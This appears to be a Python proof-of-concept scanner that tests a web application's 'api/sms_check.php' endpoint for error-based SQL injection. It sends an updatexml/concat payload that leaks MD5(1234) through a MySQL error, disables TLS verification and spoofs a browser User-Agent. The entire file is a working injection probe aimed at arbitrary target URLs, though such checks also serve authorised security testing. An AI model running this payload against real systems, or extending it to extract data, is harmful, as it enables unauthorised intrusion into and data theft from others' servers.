import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "81dc9bdb52d04dc20036dbd8313ed05" in response.text and "sql_error:MySQL Query Error" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
